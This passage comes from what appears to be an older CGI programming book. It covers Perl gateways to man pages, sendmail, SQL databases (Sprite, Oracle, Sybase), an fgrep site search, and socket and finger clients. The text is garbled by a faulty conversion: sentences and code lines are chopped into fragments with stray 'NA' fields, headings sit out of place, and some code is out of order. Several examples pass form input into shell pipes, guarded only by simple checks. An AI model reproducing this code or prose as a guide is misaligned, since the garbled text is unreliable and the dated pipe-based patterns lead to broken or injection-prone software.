The ,NA,NA
-e,NA,NA
" switch returns TRUE if the file exists. If the manual page is found, the ",NA,NA
temp_section,NA,NA
 variable contains ,NA,NA
the section number.,NA,NA
},NA,NA
 return ($temp_section);,NA,NA
The subroutine returns the value stored in ,NA,NA
$temp_section,NA,NA
". If the specified manual page is not found, it returns ",NA,NA
zero.,NA,NA
The ,NA,NA
check_section,NA,NA
" subroutine checks the specified section for the particular manual page. If it exists, the ",NA,NA
"section number passed to the subroutine is returned. Otherwise, the subroutine returns zero to indicate failure. ",NA,NA
Remember that you may have to modify this program to reflect the directories and filenames of manual pages ,NA,NA
on your system.,NA,NA
sub check_section ,NA,NA
{,NA,NA
" local ($temp_section, $temp_file);",NA,NA
 $temp_section = 0;,NA,NA
" $temp_file    = join ("""", $man_path, ""/man"", $section,",NA,NA
" ""/"", $manpage, ""."", $section);",NA,NA
 if (-e $temp_file) {,NA,NA
 $temp_section = $section;,NA,NA
 },NA,NA
 return ($temp_section); ,NA,NA
},NA,NA
The heart of this gateway is the ,NA,NA
display_manpage,NA,NA
 subroutine. It does not try to interpret the ,NA,NA
nroff,NA,NA
 codes in the ,NA,NA
manual page. Manual page style is complex enough that our best bet is to invoke ,NA,NA
nroff,NA,NA
", which has always been ",NA,NA
used to format the pages. But there are big differences between the output generated by ,NA,NA
nroff,NA,NA
 and what we ,NA,NA
want to see on a web browser. The ,NA,NA
nroff,NA,NA
" utility produces output suitable for an old-fashioned line printer, ",NA,NA
which produced bold and underlined text by backspacing and reprinting. ,NA,NA
nroff,NA,NA
 also puts a header at the top of ,NA,NA
"each page and a footer at the bottom, which we have to remove. Finally, we can ignore a lot of the blank space ",NA,NA
generated by ,NA,NA
nroff,NA,NA
", both at the beginning of each line and in between lines.",NA,NA
The ,NA,NA
display_manpage,NA,NA
 subroutine starts by running the page through ,NA,NA
nroff,NA,NA
". Then, the subroutine performs a ",NA,NA
few substitutions to make the page look good on a web browser.,NA,NA
sub display_manpage ,NA,NA
{,NA,NA
" local ($file, $blank, $heading);",NA,NA
" $file = join ("""", $man_path, ""/man"", $section, ",NA,NA
" ""/"", $manpage, ""."", $section);",NA,NA
" print ""Content-type: text/html"", ""\n\n"";",NA,NA
" print ""<HTML>"", ""\n"";",NA,NA
" print ""<HEAD><TITLE>UNIX Manual Page Gateway</TITLE></HEAD>"", ",NA,NA
"""\n"";",NA,NA
" print ""<BODY>"", ""\n"";    ",NA,NA
" print ""<H1>UNIX Manual Page Gateway</H1>"", ""\n"";",NA,NA
" print ""<HR><PRE>"";",NA,NA
The usual MIME header and HTML text are displayed.,NA,NA
" open (MANUAL, ""$nroff $file |"");",NA,NA
A pipe to the ,NA,NA
nroff,NA,NA
" program is opened for output. Whenever you open a pipe, it is critical to check that there ",NA,NA
"are no shell metacharacters on the command line. Otherwise, a malicious user can execute commands on your ",NA,NA
machine! This is why we performed the check at the beginning of this program.,NA,NA
 $blank = 0;,NA,NA
The ,NA,NA
blank,NA,NA
 variable keeps track of the number of consecutive empty lines in the document. If there is more than ,NA,NA
"one consecutive blank line, it is ignored.",NA,NA
 while (<MANUAL>) {,NA,NA
 next if ( (/^$manpage\(\w+\)/i) || (/\b$last_line/o) );,NA,NA
The ,NA,NA
while,NA,NA
 loop iterates through each line in the manual page. The ,NA,NA
next,NA,NA
 construct ignores the first and last lines ,NA,NA
"of each page. For example, the first and last lines of each page of the ",NA,NA
emacs,NA,NA
 manual page look like this:,NA,NA
EMACS(1)                 USER COMMANDS                   EMACS(1) ,NA,NA
.,NA,NA
.,NA,NA
.,NA,NA
Sun Release 4.1    Last change: 1994 April 19                   1,NA,NA
"This is unnecessary information, and therefore we skip over it. The ",NA,NA
if,NA,NA
 statement checks for a string that does ,NA,NA
not contain any spaces. The previous ,NA,NA
while,NA,NA
" statement stores the current line in Perl's default variable, ",NA,NA
$_,NA,NA
. A ,NA,NA
regular expression without a corresponding variable name matches against the value stored in ,NA,NA
$_,NA,NA
.,NA,NA
 if (/^([A-Z0-9_ ]+)$/) {,NA,NA
 $heading = $1;,NA,NA
" print ""<H2>"", $heading, ""</H2>"", ""\n"";",NA,NA
"All manual pages consist of distinct headings such as ""NAME,"" ""SYNOPSIS,"" ""DESCRIPTION,"" and ""SEE ",NA,NA
"ALSO,"" which are displayed as all capital letters. This conditional checks for such headings, stores them in the ",NA,NA
variable ,NA,NA
heading,NA,NA
", and displays them as HTML level 2 headers. The heading is stored to be used later on.",NA,NA
 } elsif (/^\s*$/) {,NA,NA
 $blank++;,NA,NA
 if ($blank < 2) {,NA,NA
 print;,NA,NA
 },NA,NA
"If the line consists entirely of whitespace, the subroutine increments the ",NA,NA
$blank,NA,NA
 variable. If the value of that ,NA,NA
"variable is greater than two, the line is ignored. In other words, consecutive blank lines are ignored.",NA,NA
 } else {,NA,NA
 $blank = 0;,NA,NA
 s//&amp;/g       if (/&/);,NA,NA
 s//&lt;/g        if (/</);,NA,NA
 s//&gt;/g        if (/>/);,NA,NA
The ,NA,NA
blank,NA,NA
" variable is initialized to zero, since this block is executed only if the line contains non-",NA,NA
"whitespace characters. The regular expressions replace the ""&"", ""<"", and "">"" characters with their HTML ",NA,NA
"equivalents, since these characters have a special meaning to the browser.",NA,NA
 if (/((_\010\S)+)/) {,NA,NA
 s//<B>$1<\/B>/g;,NA,NA
 s/_\010//g;,NA,NA
 },NA,NA
All manual pages have text strings that are underlined for emphasis. The ,NA,NA
nroff,NA,NA
 utility creates an underlined ,NA,NA
"effect by using the ""_"" and the ""^H"" (Control-H or \010) characters. Here is how the word ""options"" would ",NA,NA
be underlined:,NA,NA
_^Ho_^Hp_^Ht_^Hi_^Ho_^Hn_^Hs,NA,NA
The regular expression in the ,NA,NA
if,NA,NA
 statement searches for an underlined word and stores it in ,NA,NA
$1,NA,NA
", as illustrated ",NA,NA
below.,NA,NA
This first substitution statement adds the <B> .. </B> tags to the string:,NA,NA
<B>_^Ho_^Hp_^Ht_^Hi_^Ho_^Hn_^Hs</B>,NA,NA
"Finally, the ""_^H"" characters are removed to create:",NA,NA
<B>options</B>,NA,NA
Let's modify the file in one more way before we start to display the information:,NA,NA
 if ($heading =~ /ALSO/) {,NA,NA
 if (/([\w\+\-]+)\((\w+)\)/) {,NA,NA
" s//<A HREF=""$script\?manpage=$1&section=$2"">$1($2)<\/A>/g;",NA,NA
 },NA,NA
 },NA,NA
"Most manual pages contain a ""SEE ALSO"" heading under which related software applications are listed. Here ",NA,NA
is an example:,NA,NA
SEE ALSO,NA,NA
" X(1), xlsfonts(1), xterm(1), xrdb(1)",NA,NA
The regular expression stores the command name in ,NA,NA
$1,NA,NA
 and the manpage section number in ,NA,NA
$2,NA,NA
", as seen below. ",NA,NA
"Using this regular expression, we add a hypertext link to this program for each one of the listed applications. ",NA,NA
"The query string contains the manual page title, as well as the section number.",NA,NA
The program continues as follows:,NA,NA
 print;,NA,NA
 },NA,NA
 },NA,NA
" print ""</PRE><HR>"", ""\n"";",NA,NA
" print ""</BODY></HTML>"", ""\n"";",NA,NA
},NA,NA
 close (MANUAL);,NA,NA
"Finally, the modified line is displayed. After all the lines in the file--or pipe--are read, it is closed. ",NA,NA
Figure 9.3 ,NA,NA
shows the output produced by this application.,NA,NA
Figure 9.3: Manual page gateway,NA,NA
This particular gateway program concerned itself mostly with the output of the program it invoked (,NA,NA
nroff,NA,NA
). ,NA,NA
You will see in this chapter that you often have to expend equal effort (or even more effort) fashioning input,NA,NA
in the way the existing program expects it. Those are the general tasks of gateways.,NA,NA
Netscape Persistent Cookies,NA,NA
Mail Gateway,NA,NA
9.2 Mail Gateway,"Ever wish you could send electronic mail from your web browser? This gateway allows you to do just that.
  
 #!/usr/local/bin/perl 
  
 $webmaster = ""shishir\@bu\.edu""; 
  
 $gateway = ""CGI Mail Gateway [v1.0]""; 
  
 $request_method = $ENV{'REQUEST_METHOD'}; 
 $sendmail = ""/usr/lib/sendmail -t -n -oi"";
  
 This program uses the UNIX 
 sendmail
  utility to actually send the message. The 
 -t 
 option instructs 
 sendmail
  to scan 
 the message for the ""To:"" mail header, and the 
 n
  option prevents the user from entering aliases for the recipient's 
 email address; you would not want some remote user to use your system's internal aliases, would you?
  
 $address_file = ""/home/shishir/httpd_1.4.2/cgi-bin/address.dat"";
  
 The address file consists of a list of recipients' mail addresses from which the user is required to select one. The user 
 cannot enter an address that is not included in the address file. The 
 address.dat
  file should be formatted as follows:
  
 Webmaster,webmaster@bu.edu 
  
 Author,shishir@bu.edu 
  
 .
  
 .
  
 .
  
 I have chosen a comma to separate nicknames from addresses because Internet standards prohibit a comma from 
 being used in an address.
  
 When the mail form is displayed, the program inserts all of the descriptive names in a scrolled list. If you do not want 
 to have such a file, remove or comment out the line defining 
 $address_file
 .
  
 $exclusive_lock = 2; 
  
 $unlock = 8; 
  
 if ( defined ($address_file) && (-e $address_file) ) {
  
  
 &load_address (*address); 
  
 }
  
 If the 
 address_file
  variable is defined and the file exists, the 
 load_address
  subroutine is called to load the list of 
 addresses into the 
 address
  associative array (for easy retrieval).
  
 &parse_form_data (*MAIL);
  
 The form information is stored in the 
 MAIL
  associative array. The 
 parse_form_data
  subroutine is the same as the one 
 used at the beginning of 
 Chapter 7, 
 Advanced Form Applications
 . Like the guestbook application I presented in 
 Chapter 7, 
 Advanced Form Applications
 , this program is two in one: Half of the program displays a form, and the",NA
9.3 Relational Databases,"So far in this chapter, we have created pretty simple gateways by piping input to other programs. As long as we create the
  
 proper stream of data, it takes very little coding on our part to make these work. But the most interesting uses for gateways
  
 involve large, complex sets of data organized into structured databases. Piping a stream does not work for these; we need to
  
 use a language that the database understands, such as SQL. This is where we turn in this section.
  
 By combining the power of relational database management systems (RDBMS) with the World Wide Web, one can produce
  
 impressive results. Put yourself in the shoes of a doctor who wants to establish an ""interactive, virtual infirmary"" on the Web,
  
 where users (patients) can simply enter their symptoms, and the CGI would return with a diagnosis. The doctor has a large
  
 database that contains extensive data, including three-dimensional graphics and multimedia, on the various diseases and
  
 ailments that affect humans. All that needs to be done is to write a CGI program that decodes the input, assembles a query of
  
 some sort, sends it to the database, processes the return data from the database, and creates a hypertext document (with
  
 embedded multimedia) for the user. These types of applications are possible by combining databases with the Web.
  
 Before we go any further, let's look at SQL, the query language used to communicate with various RDBMS systems.",NA
Introduction to SQL,"SQL--pronounced ""S Q L"" and not ""Sequel""--is a standardized sub-language to access and manipulate data within a relational
  
 database system. The original SQL prototype defined a ""structured"" language, thus the term Structured Query Language, but
  
 this is no longer true of the current SQL-92 standard. SQL was designed specifically to be used in conjunction with a primary
  
 high-level programming language. In fact, most of the basic constructs that you would find in a high-level language, such as
  
 loops and conditionals, do not exist in SQL.
  
 Most of the commercial relational database systems in use today, such as Oracle and Sybase, support SQL. As a result, the
  
 code to access and manipulate a database can be ported easily and quickly to any platform. Now, let's look at SQL.
  
 Creating a database
  
 We will start out by discussing how a database is created. Suppose you have the following information:
  
 Player 
  
 Years Points Rebounds Assists Championships
  
 Larry Bird 
  
 12 
  
 28 
  
 10 
  
 7 
  
 3
  
 Michael Jordan 
  
 10 
  
 33 
  
 6 
  
 5 
  
 3
  
 Magic Johnson 
  
 12 
  
 22 
  
 7 
  
 12 
  
 5
  
 John Stockton 
  
 10 
  
 16 
  
 3 
  
 13 
  
 0
  
 Karl Malone 
  
 10 
  
 25 
  
 11 
  
 3 
  
 0
  
 Shaquille O'Neal 2 
  
 29 
  
 12 
  
 3 
  
 0
  
 The SQL code to create this database is:
  
 create table Player_Info
  
 (
  
  Player            character varying (30) not null,
  
  Years             integer,",NA
Sprite,"Never heard of Sprite? That is because I developed it for this book. It is a Perl 5 module that allows you to manipulate text-
 delimited databases (all data and delimiters are text) using a small but important subset of SQL-92. I offer Sprite so you can 
 create your own databases and access them in CGI scripts, even if you do not have a database product like Sybase or 
 Oracle. See 
 Appendix E, 
 Applications, Modules, Utilities, and Documentation
  for information on where you can get Sprite.
  
 If you do have a commercial product, you can use techniques like those shown here to issue SQL commands. We will use 
 some Perl interfaces to Oracle and Sybase later in the chapter. Let's look at an example.
  
 Employee database
  
 Let's assume that you have a text file that contains a list of your company's employees, as well as some information about 
 them:
  
 Last,First,Job_Title,Department,EMail,Phone 
  
 Supra,John,System Operator,Systems,jsupra,(617) 555-1578 
  
 Painton,Todd,Network Engineer,Systems,tpainton,(617) 555-6530 
  
 Martin,Robert,Sales Representative,Sales,martinr,(617) 555-7406 
  
 Levine,Julia,Administrative Assistant,Administration,julia,(617) 555-3056 
 Keenan,Jeff,Manager,Software,jeffk,(617) 555-7769 
  
 Nets,Laurie,Group Leader,Development,lnets,(617) 555-9962
  
 The first line of the file contains the field names (delimited by commas). This is all you need to use the database. Unlike 
 other databases that store the data in a unique (and strange) format, Sprite operates on plain text.
  
 Here is the form that will act as the front end to the database:
  
 <HTML> 
  
 <HEAD><TITLE>CGI Corporation</TITLE></HEAD> 
  
 <BODY> 
  
 <H1>Employee Database</H1> 
  
 Welcome to the CGI Corporations's Employee Search Form. You can use 
 this to find information about one of our employee. 
  
 Enter as much information as possible to narrow down the search. 
  
 <HR> 
  
 <FORM ACTION=""/cgi-bin/db_phone.pl"" METHOD=""POST""> 
  
 <PRE> 
  
 Last Name:      <INPUT TYPE=""text"" NAME=""Last"" SIZE=40> 
 First Name:     <INPUT TYPE=""text"" NAME=""First"" SIZE=40> Job 
 Title:      <INPUT TYPE=""text"" NAME=""Job_Title"" SIZE=40> 
 Department:     <INPUT TYPE=""text"" NAME=""Department"" 
 SIZE=40> EMail Address:  <INPUT TYPE=""text"" NAME=""EMail"" 
 SIZE=40> Phone Number:   <INPUT TYPE=""text"" NAME=""Phone"" 
 SIZE=40> </PRE> 
  
 <INPUT TYPE=""submit"" VALUE=""Submit the search""> 
  
 <INPUT TYPE=""reset""  VALUE=""Clear all fields""> 
  
 </FORM> 
  
 <HR> 
  
 </BODY></HTML>
  
 The form is shown in 
 Figure 9.5
 .
  
 Figure 9.5: Phone form
  
 [Graphic: 
  
 Figure 9-5]
  
 Now, let's build the CGI application that will decode the form information, process the user's query, and create a 
 document displaying the results, as seen in 
 Figure 9.6
 .
  
 Figure 9.6: CGI gateway to database",NA
A Gateway to an Oracle Database,"Now, let's look at CGI gateways to the two most popular commercial databases: Oracle and Sybase. Each of these is 
 supported by Perl and Tcl extensions that make our job much easier by letting us submit SQL queries that the database 
 recognizes. I will use Oracle and Sybase to illustrate two different ways to display the results of a query. In this section, I will 
 query an Oracle database and plot the data using 
 gnuplot
  (available from 
 ftp://prep.ai.mit.edu/pub/gnu/gnuplot-3.5.tar.gz
 ). In 
 the next section, I will use Sybase and display the results in a table using HTML.
  
 Suppose you have a database consisting of stock trading history for various companies over an eleven-year span (from 
 1980 through 1990). A sample table is shown below:",NA
Accessing a Sybase Database,"In this example, the form input (from the user) is used to access a Sybase database to look up information on books. Our 
 interface to Sybase is the 
 sybperl
  library, which provides Perl subroutines for giving Sybase queries in the form it can 
 recognize. The data returned by Sybase is converted to an HTML 3.0 table format. In other words, the output, when 
 displayed on a browser that recognizes HTML 3.0, resembles a nice table with solid three-dimensional lines separating the 
 different fields.
  
 <HTML> 
  
 <HEAD><TITLE>Welcome to CGI Publishing Company</TITLE></HEAD> 
  
 <BODY> 
  
 <H1>Book Search</H1> 
  
 <HR> 
  
 <FORM ACTION=""/cgi-bin/books.pl"" METHOD=""GET""> 
  
 <EM>Please enter the name of the book that you would like to look up:</EM> 
 <P> 
  
 <INPUT TYPE=""text"" NAME=""Book"" SIZE=40> 
  
 <P> 
  
 <INPUT TYPE=""submit"" VALUE=""Look Up This Book""> 
  
 <INPUT TYPE=""reset""  VALUE=""Clear the Information""> 
  
 </FORM> 
  
 <HR> 
  
 </BODY> 
  
 </HTML>
  
 Above is the form that is used to retrieve the input from the user.
  
 Let's look at the program:
  
 #!/usr/local/bin/sybperl 
  
 require ""sybperl.pl""; 
  
 $user = ""shishir"";",NA
9.4 Search/Index Gateway,NA,NA
One of the most useful CGI applications is a web server search/index gateway. This allows a user to search ,NA,NA
all of the files on the server for particular information. Here is a very simple gateway to do just that. We rely ,NA,NA
on the UNIX command ,NA,NA
fgrep [1],NA,NA
" to search all our files, and then filter its output to something attractive and ",NA,NA
"useful. First, let's look at the form's front end:",NA,NA
[1] The ,NA,NA
fgrep,NA,NA
 used in the example is GNU ,NA,NA
fgrep,NA,NA
" version 2.0, which supports the -A and -B ",NA,NA
options.,NA,NA
<HTML> ,NA,NA
<HEAD><TITLE>Search Gateway</TITLE></HEAD> ,NA,NA
<BODY> ,NA,NA
<H1>Search Gateway</H1> ,NA,NA
<HR> ,NA,NA
"<FORM ACTION=""/cgi-bin/search.pl"" METHOD=""POST""> ",NA,NA
What would you like to search for: ,NA,NA
<BR> ,NA,NA
"<INPUT TYPE=""text"" NAME=""query"" SIZE=40> ",NA,NA
<P> ,NA,NA
"<INPUT TYPE=""submit"" VALUE=""Start Searching!""> ",NA,NA
"<INPUT TYPE=""reset""  VALUE=""Clear your form""> ",NA,NA
</FORM> ,NA,NA
<HR> ,NA,NA
</BODY> ,NA,NA
</HTML>,NA,NA
"Nothing fancy. The form contains just one field to hold the search query. Now, here is the program:",NA,NA
#!/usr/local/bin/perl ,NA,NA
"$webmaster = ""Shishir Gundavaram (shishir\@bu\.edu)""; ",NA,NA
"$fgrep = ""/usr/local/bin/fgrep""; ",NA,NA
$document_root = $ENV{'DOCUMENT_ROOT'};,NA,NA
The ,NA,NA
fgrep,NA,NA
 UNIX command is used to perform the actual searching in the directory pointed to by the variable ,NA,NA
document_root,NA,NA
. ,NA,NA
fgrep,NA,NA
" searches for fixed strings; in other words, wildcards and regular expressions are not ",NA,NA
evaluated.,NA,NA
&parse_form_data (*SEARCH); ,NA,NA
$query = $SEARCH{'query'};,NA,NA
The form data (or one field) is decoded and stored in the SEARCH associative array.,NA,NA
"if ($query eq """") {",NA,NA
" &return_error (500, ""Search Error"", ""Please enter a search query.""); ",NA,NA
} elsif ($query !~ /^(\w+)$/) {,NA,NA
" &return_error (500, ""Search Error"", ""Invalid characters in query.""); ",NA,NA
} else {,NA,NA
"If the query entered by the user contains a non-alphanumeric character (A-Z, a-z, 0-9, _), or is empty, an ",NA,NA
error message is returned.,NA,NA
" print ""Content-type: text/html"", ""\n\n"";",NA,NA
" print ""<HTML>"", ""\n"";",NA,NA
" print ""<HEAD><TITLE>Search Results</TITLE></HEAD>"";",NA,NA
" print ""<BODY>"", ""\n"";",NA,NA
" print ""<H1>Results of searching for: "", $query, ""</H1>"";",NA,NA
" print ""<HR>"";",NA,NA
" open (SEARCH, ""$fgrep -A2 -B2 -i -n -s $query $document_root/* |"");",NA,NA
The pipe is opened to the ,NA,NA
fgrep,NA,NA
 command for output. We use the following command-line options:,G,NA
-A2,NA,NA
 and ,NA,NA
-B2,NA,NA
 display two lines before and after the match,G,NA
-i,NA,NA
 indicates case insensitivity,G,NA
-n,NA,NA
 displays the line numbers,G,NA
-s,NA,NA
 instructs fgrep to suppress all error messages.,NA,NA
Here is what the output format looks like:,NA,NA
"/abc/cde/filename.abc-57-Previous, previous line ",NA,NA
/abc/cde/filename.abc-58-Previous line ,NA,NA
/abc/cde/filename.abc-59:Matched line ,NA,NA
/abc/cde/filename.abc-60-Following line ,NA,NA
"/abc/cde/filename.abc-61-Following, following line",NA,NA
"As you can see, a total of five or more lines are output for each match. If the query string is found in multiple ",NA,NA
"files, ",NA,NA
fgrep,NA,NA
" returns the ""--"" boundary string to separate the output from the different files.",NA,NA
 $count = 0;,NA,NA
 $matches = 0;,NA,NA
 %accessed_files = ();,NA,NA
"Three important variables are initialized. The first one, ",NA,NA
count,NA,NA
", is used to keep track of the number of lines ",NA,NA
returned per match. The ,NA,NA
matches,NA,NA
 variable stores the number of different files that contain the specified query. ,NA,NA
"And finally, the ",NA,NA
accessed_files,NA,NA
 associative array keeps track of the filenames that contain a match.,NA,NA
We could have used another ,NA,NA
grep,NA,NA
" command that returned just filenames, and then our processing would be ",NA,NA
"much easier. But I want to display the actual text found, so I chose more complicated output. Thus, I have to ",NA,NA
do a little fancy parsing and text substitution to change the lines of ,NA,NA
fgrep,NA,NA
 output into something that looks ,NA,NA
good on a web browser. What we want to display is:,G,NA
"The name of each file found, with a hypertext link so the user can go directly to a file",G,NA
The text found with the search string highlighted,G,NA
A summary of the files found,NA,NA
The following code performs these steps.,NA,NA
 while (<SEARCH>) {,NA,NA
" if ( ($file, $type, $line) = m|^(/\S+)([\-:])\d+\2(.*)| ) {",NA,NA
The ,NA,NA
while,NA,NA
 loop iterates through the data returned by ,NA,NA
fgrep,NA,NA
". If a line resembles the format presented above, ",NA,NA
this block of code is executed. The regular expression is explained below.,[Graphic: Figure from the text],NA
 unless ($count) {,NA,NA
 if ( defined ($accessed_files{$file}) ) {,NA,NA
 next;,NA,NA
 } else {,NA,NA
 $accessed_files{$file} = 1;,NA,NA
 },NA,NA
 $file =~ s/^$document_root\/(.*)/$1/;,NA,NA
 $matches++;,NA,NA
" print qq|<A HREF=""/$file"">$file</A><BR><BR>|; }",NA,NA
If ,NA,NA
count,NA,NA
" is equal to zero (which means we are either on line 1 or on the line right after the boundary), the ",NA,NA
"associative array is checked to see if an element exists for the current filename. If it exists, there is a ",NA,NA
"premature break from the conditional, and the ",NA,NA
while,NA,NA
" loop executes again. If not, the ",NA,NA
matches,NA,NA
 variable is ,NA,NA
"incremented, and a hypertext anchor is linked to the relative pathname of the matched file.",NA,NA
"Remember, if there is more than one match per file, ",NA,NA
fgrep,NA,NA
 returns the matched lines as separate entities ,NA,NA
"(separated by the ""--"" string). Since we want only one link per filename, the associative array has to be used ",NA,NA
"to ""cache"" the filename.",NA,NA
 $count++;,NA,NA
 $line =~ s/<(([^>]|\n)*)>/&lt;$1&gt;/g;,NA,NA
The ,NA,NA
count,NA,NA
" variable is incremented so that the next time through the loop, the previous block of code will not ",NA,NA
"be executed, and therefore a hypertext link will not be created. Also, all HTML tags are ""escaped"" by the ",NA,NA
"regular expression illustrated below, so that they appear as regular text when this dynamic document is ",NA,NA
"displayed. If we did not escape these tags, the browser would interpret them as regular HTML statements, ",NA,NA
and display formatted output.,[Graphic: Figure from the text],NA
We could totally remove all tags by using:,NA,NA
$line =~ s/<(([^>]|\n)*)>//g;,NA,NA
Let's continue with the program:,NA,NA
 if ($line =~ /^[^A-Za-z0-9]*$/) {,NA,NA
 next;,NA,NA
 },NA,NA
"If a line consists of any characters besides the subset of alphanumeric characters (A-Z, a-z, 0-9), the line will ",NA,NA
not be displayed.,NA,NA
" if ($type eq "":"") {",NA,NA
 $line =~ s/($query)/<B>$1<\/B>/ig; },NA,NA
" print $line, ""<BR>"";",NA,NA
"For the matched line, the query is emboldened using the <B> ... </B> HTML tags, and printed.",NA,NA
 },NA,NA
 } else {,NA,NA
 if ($count) {,NA,NA
" print ""<HR>"";",NA,NA
 $count = 0;,NA,NA
 },NA,NA
 },NA,NA
"This conditional is executed if the line contains the boundary string, in which case a horizontal rule is output ",NA,NA
and the counter is initialized.,NA,NA
" print ""<P>"", ""<HR>"";",NA,NA
" print ""Total number of files containing matches: "", $matches, ""<BR>"";",NA,NA
 ,NA,NA
"print ""<HR>"";",NA,NA
" print ""</BODY></HTML>"", ""\n"";",NA,NA
 close (SEARCH); ,NA,NA
} ,NA,NA
exit (0);,NA,NA
"Finally, the total number of files that contained matches to the query are displayed, as shown in ",NA,NA
Figure 9.11,NA,NA
.,NA,NA
Figure 9.11: Search results,"[Graphic: 
  
 Figure 9-11]",NA
This is a very simple example of a search/index utility. It can be quite slow if you need to search hundreds ,NA,NA
"(or thousands) of documents. However, there are numerous indexing engines (as well as corresponding CGI ",NA,NA
"gateways) that are extremely fast and powerful. These include Swish and Glimpse. See Appendix E, ",NA,NA
information on where to retrieve those packages.,NA,NA
Relational Databases,NA,NA
Gateways to Internet,NA,NA
Information Servers,NA,NA
10. Gateways to Internet Information ,NA,NA
Servers,NA,NA
Contents: ,NA,NA
Overview ,NA,NA
What Are Sockets?,NA,NA
Socket I/O in Perl,NA,NA
Socket Library,NA,NA
Checking Hypertext (HTTP) Links,NA,NA
Archie,NA,NA
Network News on the Web,NA,NA
Magic Cookies,NA,NA
Maintaining State with a Server,NA,NA
Forking/Spawning Child Processes,NA,NA
10.1 Overview,NA,NA
You have probably heard of information servers on the Internet such as Archie (which lets you search ,NA,NA
"FTP sites) and NNTP (the Usenet news server). Like the Web itself, these services run as protocols on ",NA,NA
"top of TCP/IP. To make these services available over the Web, you can develop CGI applications that ",NA,NA
act as clients to other Internet information servers using the TCP/IP network protocol.,NA,NA
Let's start by looking at how a server functions. Take an electronic mail application (though the theory ,NA,NA
"can apply to any other server). Most mail programs save the user's messages in a particular file, ",NA,NA
typically in the ,NA,NA
/var/spool/mail,NA,NA
" directory. When you send mail to someone on a different host, the ",NA,NA
mail program must find the recipient's mail file on that machine and append the message to it. How ,NA,NA
"exactly does the mail program achieve this task, since it cannot manipulate files on a remote host ",NA,NA
directly?,NA,NA
The answer to this question is ,NA,NA
interprocess communication,NA,NA
 (IPC). A process on the remote host acts as ,NA,NA
a messenger for the mail process on that machine. The local process communicates with this remote ,NA,NA
"agent across a network to ""deliver"" mail. As a result, the remote process is called a server (it ",NA,NA
"""services"" an issued request), and the local process is referred to as a client. The Web works along the ",NA,NA
same philosophy: the browser is the client that issues a request to an HTTP server that interprets and ,NA,NA
executes the request.,NA,NA
"The most important thing to remember here is that the client and the server must ""speak the same ",NA,NA
"language."" In other words, a particular client is designed to work with a specific server. So, for ",NA,NA
"example, an Archie client cannot communicate with a Web server. But if you know the stream of data ",NA,NA
"expected by a server, and the stream produced as output, you can write a CGI program that ",NA,NA
"communicates with it, as we showed in the previous chapter.",NA,NA
One very useful application we will show in this chapter is one where you create both the client and ,NA,NA
"the server. This will be a cookie handler, which helps you keep track of data when it is entered into ",NA,NA
multiple forms.,NA,NA
The communication protocols depend on the type of UNIX system. The version of UNIX from ,NA,NA
"AT&T, called System V, provides STREAMS to communicate with processes across a network. On ",NA,NA
"the other hand, the BSD flavor of UNIX, from the University of California at Berkeley, implements ",NA,NA
objects called ,NA,NA
sockets,NA,NA
" for network communication. In this chapter, we will look only at BSD sockets ",NA,NA
"(also adopted by the PC world), which are, by far, the most popular way to handle network ",NA,NA
communications.,NA,NA
Search/Index Gateway,NA,NA
What Are Sockets?,NA,NA
10.2 What Are Sockets?,NA,NA
Most companies these days have a telephone switchboard that acts as a gateway for calls coming in ,NA,NA
and going out. A socket can be likened to a telephone switchboard. If you want to connect to a remote ,NA,NA
"host, you need to first create a socket through which the communications occur. This is similar to ",NA,NA
"dialing ""9"" to go through the switchboard to the outside world.",NA,NA
"Similarly, if you want to create a server that accepts connections from remote (or local) hosts, you ",NA,NA
"need to set up a socket that ""listens"" periodically for connections. The socket is identified on the ",NA,NA
"Internet by the host's IP address and the ""port"" that it listens on. Once a connection is established, a ",NA,NA
"new socket is created to handle this connection, so that the original socket can go back and listen for ",NA,NA
"more connections. The switchboard works in the same manner: as it handles outside phone calls, it ",NA,NA
routes them to the appropriate extension and goes back to accept more calls.,NA,NA
Overview,NA,NA
Socket I/O in Perl,NA,NA
10.3 Socket I/O in Perl,"The functions used to set up sockets in Perl have the same names as the corresponding UNIX system functions, but 
 the arguments to the socket functions are slightly different, because of the way Perl works. Let's look at an example 
 that implements a client to the 
 finger server
 .
  
 Please note that this not a CGI script. However, it should be very easy to convert this to a CGI script if so desired. It is 
 meant to be run from the command line and to be passed one argument, the name of the user you want information 
 about:
  
 % finger_client username[@host]
  
 As you can see, the calling format is identical to that of the UNIX 
 finger
  command. In fact, this program works in the 
 same exact manner.
  
 #!/usr/local/bin/perl 
  
 require ""sys/socket.ph"";
  
 The Perl header file "" socket.ph"" contains definitions pertaining to different types of sockets, their addressing 
 schemes, etc. We will look at some of these definitions in a moment.
  
 If this file is not found, you (or the system administrator) need to run the 
 h2ph
  Perl script that converts all the C/C++ 
 header files into a format that Perl can understand. Now, let's continue.
  
 chop ($hostname = `bin/hostname`); 
  
 $input = shift (@ARGV);
  
 The current hostname is retrieved with the UNIX 
 hostname
  command. And the input to the script is stored in the 
 input 
 variable. The 
 shift
  statement simply returns the first element of an array.
  
 ($username, $remote_host) = split (/@/, $input, 2);
  
 The specified username and remote host are split from the 
 input
  variable.
  
 unless ($remote_host) {
  
  
  $remote_host = $hostname; 
  
 }
  
 If no host is specified, it defaults to the local host.
  
 $service = ""finger"";
  
 Once you create a socket, it is usually bound (or attached) to a port on the machine. In order to send a message--or 
 request--to the server, you have to send it to the port the server is running on. Generally, most of the common servers 
 (like FTP, Archie, Gopher, HTTP, and Finger) run on specific ports, and are usually the same on nearly all hosts 
 across the Net. Otherwise, clients on different machines would not be able to access the servers, because they would",NA
10.4 Socket Library,NA,NA
"To make the whole task of creating clients and servers easier, a socket library was developed that ",NA,NA
encapsulates the various socket and network information functions. Here is the same finger client ,NA,NA
using the library:,NA,NA
#!/usr/local/bin/perl ,NA,NA
"require ""sockets.pl""; ",NA,NA
"$service = ""finger""; ",NA,NA
chop ($hostname = `/bin/hostname`); ,NA,NA
$input = shift (@ARGV); ,NA,NA
"($username, $remote_host) = split (/@/, $input, 2); ",NA,NA
unless ($remote_host) {,NA,NA
 $remote_host = $hostname; ,NA,NA
},NA,NA
"Most of the code here is the same as that used in the previous example, with one exception. The ",NA,NA
require,NA,NA
 command includes the ,NA,NA
sockets.pl ,NA,NA
library.,NA,NA
"&open_connection (FINGER, $remote_host, $service) ",NA,NA
" || die ""Cannot open connection to: $remote_host"", ""\n"";",NA,NA
The ,NA,NA
open_connection,NA,NA
 library subroutine performs the following tasks:,G,NA
Check to see if the remote host is an IP number (,NA,NA
128.197.152.10,NA,NA
") or an IP name (acs.bu.edu), ",NA,NA
